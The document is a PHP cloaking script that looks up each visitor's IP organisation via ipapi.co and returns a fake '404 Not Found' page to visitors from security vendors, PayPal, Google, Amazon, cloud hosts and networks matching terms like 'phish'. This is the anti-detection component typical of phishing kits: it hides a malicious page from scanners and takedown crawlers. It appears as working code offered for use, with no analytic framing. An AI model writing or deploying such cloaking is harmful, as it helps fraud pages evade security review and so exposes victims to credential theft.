<?php 
function validate_ip($ip){
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}
function get_ip_address() {
    $ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (validate_ip($ip)) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
}

$ip = get_ip_address(); 


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://ipapi.co/$ip/org/");
curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_REFERER, 'http://ip-api.com');
$output = strtolower(curl_exec($ch));
curl_close($ch);


if (strpos($output, 'node32')!== false || strpos($output,'the rocket science group')!== false || strpos($output,'llc')!== false || strpos($output,'amazon.com')!== false || strpos($output,'amazon')!== false || strpos($output,'chrome')!== false || strpos($output,'google')!== false || strpos($output,'phish')!== false || strpos($output,'paypal')!== false || strpos($output,'dedfiberco')!== false || strpos($output,'palo alto networks')!== false || strpos($output,'digital ocean')!== false || strpos($output,'digitalocean')!== false || strpos($output,'google cloud')!== false || strpos($output,'cloud')!== false || strpos($output,'107.178.194.44')!== false || strpos($output,'trustwave holdings')!== false || strpos($output,'holdings')!== false || strpos($output,'trustwave')!== false || strpos($output,'softlayer technologi')!== false || strpos($output,'softlayer')!== false || strpos($output,'surfcontrol')!== false || strpos($output,'egihosting')!== false || strpos($output,'logicweb')!== false || strpos($output,'choopa')!== false || strpos($output,'shinjiru')!== false || strpos($output,'logicweb')!== false || strpos($output,'inc')!== false || strpos($output,'total server solutions')!== false || strpos($output,'brookhaven national laboratory')!== false || strpos($output,'ovh hosting')!== false || strpos($output,'xfera moviles s.a.')!== false || strpos($output,'avast software s.r.o.')!== false || strpos($output,'avast')!== false || strpos($output,'privax ltd.')!== false || strpos($output,'privax')!== false || strpos($output,'ltd')!== false || strpos($output,'m247 europe srl')!== false || strpos($output,'wintek corporation')!== false || strpos($output,'sungard availability network solutions')!== false || strpos($output,'network solutions')!== false || strpos($output,'mcafee')!== false || strpos($output,'google proxy')!== false || strpos($output,'contina communications, llc')!== false || strpos($output,'limited')!== false || strpos($output,'venus business communications limited')!== false || strpos($output,'b2 net solutions inc.')!== false || strpos($output,'sungard availability services lp')!== false || strpos($output,'sungard')!== false || strpos($output,'fastweb')!== false || strpos($output,'netstack')!== false || strpos($output,'m247 ltd')!== false || strpos($output,'uk-2 limited')!== false || strpos($output,'british telecommunications plc')!== false || strpos($output,'sky uk limited')!== false || strpos($output,'integra telecom, inc.')!== false || strpos($output,'hetzner online gmbh')!== false || strpos($output,'gmbh')!== false || strpos($output,'top level hosting srl')!== false || strpos($output,'hosting')!== false || strpos($output,'digital energy technologies limited')!== false || strpos($output,'limited')!== false || strpos($output,'kaspersky lab ao')!== false || strpos($output,'kaspersky')!== false || strpos($output,'datacamp limited')!== false || strpos($output,'quintex alliance consulting')!== false || strpos($output,'consulting')!== false || strpos($output,'transip b.v.')!== false || strpos($output,'amazon.com, inc.')!== false || strpos($output,'forcepoint cloud ltd')!== false || strpos($output,'ntt pc communications, inc.')!== false || strpos($output,'liberty global b.v.')!== false || strpos($output,'vanoppen.biz llc')!== false || strpos($output,'amazon.com')!== false || strpos($output,'cogent communications')!== false || strpos($output,'bayer business services gmbh')!== false || strpos($output,'gmbh')!== false || strpos($output,'google llc')!== false || strpos($output,'digiweb ltd')!== false || strpos($output,'eircom')!== false || strpos($output,'ghostnet gmbh')!== false || strpos($output,'voxility s.r.l.')!== false || strpos($output,'ovh sas')!== false) {
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>